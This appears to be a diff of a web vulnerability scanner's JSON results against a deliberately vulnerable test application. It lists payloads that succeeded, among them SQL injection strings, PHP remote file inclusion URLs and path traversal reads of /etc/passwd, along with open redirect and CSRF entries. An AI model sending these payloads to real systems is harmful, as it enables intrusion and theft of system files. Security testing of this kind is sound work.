@@ -4,49 +4,35 @@
         "results": {
             "http://target.com": [
                 {
-                    "endpoint": "/sqli/doublesqliaction.php", 
+                    "endpoint": "/sqli/sqli.php", 
                     "params": {
                         "username": "' or '1=1"
                     }, 
                     "method": "POST"
                 }, 
                 {
-                    "endpoint": "/sqli/doublesqliaction.php", 
-                    "params": {
-                        "username": "'1 'or' 1'='1"
-                    }, 
-                    "method": "POST"
-                }, 
-                {
                     "endpoint": "/sqli/sqli.php", 
-                    "params": {
-                        "username": "'1 'or' 1'='1"
-                    }, 
-                    "method": "POST"
-                }, 
-                {
-                    "endpoint": "/sqli/doublesqliaction.php", 
                     "params": {
                         "username": "' or '1'='1"
                     }, 
                     "method": "POST"
                 }, 
                 {
-                    "endpoint": "/sqli/doublesqliaction.php", 
+                    "endpoint": "/sqli/sqli.php", 
                     "params": {
                         "username": "'or 1=1#"
                     }, 
                     "method": "POST"
                 }, 
                 {
-                    "endpoint": "/sqli/doublesqliaction.php", 
+                    "endpoint": "/sqli/sqli.php", 
                     "params": {
                         "username": "' OR '1=1 %00"
                     }, 
                     "method": "POST"
                 }, 
                 {
-                    "endpoint": "/sqli/sqli.php", 
+                    "endpoint": "/sqli/doublesqliaction.php", 
                     "params": {
                         "username": "\" or \"1=1"
                     }, 
@@ -100,6 +86,97 @@
                         "page": "\";include(\"http://localhost/badfile.php?\");echo\""
                     }, 
                     "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/rfi.php", 
+                    "params": {
+                        "page": "../../index"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/rfi.php", 
+                    "params": {
+                        "page": "../../index"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/rfi.php", 
+                    "params": {
+                        "page": "../../index"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi1.php", 
+                    "params": {
+                        "page": "../../index"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi1.php", 
+                    "params": {
+                        "page": "../../index"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi1.php", 
+                    "params": {
+                        "page": "../../index"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi1.php", 
+                    "params": {
+                        "page": "../../index"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi2.php", 
+                    "params": {
+                        "page": "../../index.php"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi2.php", 
+                    "params": {
+                        "page": "../../index.php"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi2.php", 
+                    "params": {
+                        "page": "../../index.php"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/rfi.php", 
+                    "params": {
+                        "page": "http://localhost/badfile.php?"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/rfi.php", 
+                    "params": {
+                        "page": "http://localhost/badfile.php?"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/rfi.php", 
+                    "params": {
+                        "page": "http://localhost/badfile.php?"
+                    }, 
+                    "method": "GET"
                 }
             ]
         }
@@ -107,19 +184,170 @@
     {
         "class": "Directory Traversal", 
         "results": {
-            "http://target.com": []
+            "http://target.com": [
+                {
+                    "endpoint": "/directorytraversal/directorytraversal.php", 
+                    "params": {
+                        "ascii": "../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/directorytraversal/directorytraversal.php", 
+                    "params": {
+                        "ascii": "../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/directorytraversal/directorytraversal.php", 
+                    "params": {
+                        "ascii": "../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi2.php", 
+                    "params": {
+                        "page": "../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi2.php", 
+                    "params": {
+                        "page": "../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi2.php", 
+                    "params": {
+                        "page": "../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/directorytraversal/directorytraversal.php", 
+                    "params": {
+                        "ascii": "../../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/directorytraversal/directorytraversal.php", 
+                    "params": {
+                        "ascii": "../../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/directorytraversal/directorytraversal.php", 
+                    "params": {
+                        "ascii": "../../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi2.php", 
+                    "params": {
+                        "page": "../../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi2.php", 
+                    "params": {
+                        "page": "../../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi2.php", 
+                    "params": {
+                        "page": "../../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/directorytraversal/directorytraversal.php", 
+                    "params": {
+                        "ascii": "../../../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/directorytraversal/directorytraversal.php", 
+                    "params": {
+                        "ascii": "../../../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/directorytraversal/directorytraversal.php", 
+                    "params": {
+                        "ascii": "../../../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi2.php", 
+                    "params": {
+                        "page": "../../../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi2.php", 
+                    "params": {
+                        "page": "../../../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/serverside/lfi2.php", 
+                    "params": {
+                        "page": "../../../../../../../etc/passwd"
+                    }, 
+                    "method": "GET"
+                }
+            ]
         }
     }, 
     {
         "class": "Open Redirect", 
         "results": {
-            "http://target.com": []
+            "http://target.com": [
+                {
+                    "endpoint": "/openredirect/openredirect.php", 
+                    "params": {
+                        "redirect": "https://status.github.com/messages"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/openredirect/openredirect.php", 
+                    "params": {
+                        "redirect": "https%3A%2F%2Fstatus.github.com"
+                    }, 
+                    "method": "GET"
+                }
+            ]
         }
     }, 
     {
         "class": "Cross Site Request Forgery", 
         "results": {
-            "http://target.com": []
+            "http://target.com": [
+                {
+                    "endpoint": "/csrf/csrf.php", 
+                    "params": {
+                        "csrftoken": "abcdef1235", 
+                        "secret": "SECRET"
+                    }, 
+                    "method": "POST"
+                }
+            ]
         }
     }, 
     {
